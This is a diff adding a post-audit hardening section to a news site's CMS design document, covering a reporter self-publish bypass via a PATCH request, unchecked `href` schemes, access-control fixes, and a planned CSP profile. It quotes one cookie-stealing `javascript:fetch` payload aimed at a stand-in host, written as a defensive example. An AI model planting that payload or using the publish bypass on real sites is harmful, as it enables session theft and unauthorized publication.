@@ -200,3 +200,122 @@ This was undocumented before. It is an S9 dependency.
 - [ ] Set SPF/DKIM/DMARC and choose the bulk-sending subdomain
 - [ ] Decide whether `/admin` can be IP-restricted
 - [ ] Draft the privacy policy content (needs the owner's data-handling decisions)
+- [ ] **S15 will require a THIRD CSP profile** — see §5.1 below
+
+---
+
+## 13. Post-audit hardening (2026-09-18)
+
+Four controls were added or corrected after the S0–S12 audits. They are recorded
+here because each closed a **live** hole, and because each is the kind of thing a
+future change could silently undo.
+
+### 13.1 🚨 A reporter could publish their own article
+
+**What the code claimed.** `Articles` documented: *"Publishing itself is
+`_status: published`, and the collection `update` access below keeps that to
+editors."*
+
+**Why that was false.** The collection's `update` is `isEditorial`, which **must**
+include `reporter` — a reporter has to save their own draft. And Payload's built-in
+`_status` carried **no field-level restriction at all**. So a single
+`PATCH /api/articles/<own-id>` with `{"_status":"published"}` put an unreviewed
+story on the live site.
+
+**Fix.** `cms/src/hooks/publish.ts` → `guardPublishStatus`, attached as a
+`beforeChange` hook. It **throws** on the transition into `published` for a
+non-editor.
+
+**Why it throws rather than stripping the field.** `reviewStatus` uses a
+value-predicate `FieldAccess`, which fails **silently** — the field is stripped and
+the request returns 200 with the value quietly unchanged. For the most
+consequential action on the site, a silent no-op is the wrong answer: an editor
+who is told "forbidden" learns the rule, and a reporter cannot mistake a stripped
+write for a successful one.
+
+**Why it compares against `originalDoc`.** `beforeChange` receives the incoming
+data **merged with the existing document**, so `data._status` is `'published'` on
+*every* later save of an already-published article — including a reporter fixing a
+typo. Only the actual transition is forbidden.
+
+⚠️ **General rule this establishes:** *collection-level access cannot express a
+per-value rule.* When `update` must include a role that must not reach a
+particular value, the control is a hook, not an access function.
+
+### 13.2 🚨 CMS text fields going into `href` were not scheme-checked
+
+**The hole.** `SiteSettings.social` is four plain text fields. Three surfaces
+rendered them into `href` — the header, the footer, and the homepage's
+Organization JSON-LD `sameAs` — and **none validated the scheme**. Astro escapes
+the attribute, which stops a tag breakout, but **escaping does not neutralise a
+scheme**. A stored `javascript:fetch('//evil/'+document.cookie)` would execute on
+click, on our own origin.
+
+**Fix.** `frontend/src/lib/url.ts` → **`safeExternalUrl()`**, which allows only
+`http:` and `https:` and returns `''` otherwise. One implementation, used by the
+social links and the fact-check sources. Three copies of a security check is three
+chances to drift.
+
+**Editorial guard-rail alongside it.** `cms/src/lib/social-url.ts` rejects a bare
+handle, a missing scheme, plain `http`, and a bare **platform homepage** — the
+mistake actually made, where `https://www.fb.com/` is a valid URL that links to
+Facebook's front page rather than the newsroom's account. That is *editorial*
+correctness; `safeExternalUrl` is the *security* control. Neither replaces the
+other.
+
+⚠️ **General rule:** when a CMS field feeds an `href`, validate that it
+**identifies the thing intended**, not merely that it parses as a URL.
+
+### 13.3 ⚠️ `isSelfOrAdmin` must not be used on `authors`
+
+`Authors.update` was `isSelfOrAdmin`, which compares the **document** id to the
+**user** id. Correct for `users`; wrong here, because the link is
+`Users.authorProfile → authors`, so the two ids are different numbers and the
+`where` clause matched nothing. The effect was a flat **403 on a reporter editing
+their own profile** — while the comment above the rule claimed the opposite.
+
+**Fix.** `isOwnAuthorProfileOrEditor`, which resolves the relationship and denies
+when no profile is linked.
+
+### 13.4 Public write endpoints are protected by a whitelist, not by field access
+
+`POST /api/reporter/quick-draft` (S13) writes with `overrideAccess: false` and the
+caller's own session, so the real access rules apply. But the same reasoning as
+`endpoints/comments.ts` holds: **the body is built key by key from a whitelist**,
+never spread from the request.
+
+Verified by `verify:reporter` — a hostile body (`_status: published`, `isBreaking`,
+`isLead`, `reviewStatus: approved`, another `author`, a backdated `publishedAt`) is
+accepted as a request and **none of it reaches the database**. Critically, **the
+byline is resolved from the session, never from the body**: a byline is an
+attribution of responsibility and must not be forgeable by the person being
+attributed.
+
+### 13.5 §5.1 — the third CSP profile S15 will need
+
+`/live-tv` must embed **YouTube and Facebook** iframes. Neither existing profile
+fits:
+
+| Profile | `frame-src` | Why it fails for `/live-tv` |
+|---|---|---|
+| Strict | `'none'` | The iframe is blocked |
+| `SHIKKHA24_CSP_RELAXED` | ad domains only | **No video** — the iframe is silently blocked |
+| `SHIKKHA24_CSP_ARTICLE` | YouTube + ads | **No Facebook**, and using an `_ARTICLE`-named variable for a non-article route is semantic drift |
+
+Widening `RELAXED` was rejected: it would give the homepage, every category listing
+and `/quiz` iframe permission they do not need — a security regression.
+
+**So a third profile, `SHIKKHA24_CSP_MEDIA`, scoped to `/live-tv` (and later
+`/video`).** ⚠️ Adding it must also teach `scripts/verify-apache.mjs` the third
+profile — its expectation logic (corrected in M16 to key on `data-ad-slot`)
+assumes exactly two — and assert the rule in `verify-build-output.mjs`,
+counter-proved by injecting its removal. **All three in the same commit.**
+
+### 13.6 Verification added
+
+| Command | What it proves |
+|---|---|
+| `pnpm --filter @shikkha24/cms verify:reporter` | Reporter access control + the quick-draft whitelist — **32/32** |
+| `pnpm --filter @shikkha24/cms verify:social` | Social URL validation — **11/11** |
+| `pnpm verify:astro-imports` | `.astro` frontmatter is **not typechecked** here; every `lib/` export used must be imported |
+| `pnpm --filter @shikkha24/cms verify:rebuild-notice` | The rebuild notice appears on exactly the triggered configs — **10/10** |
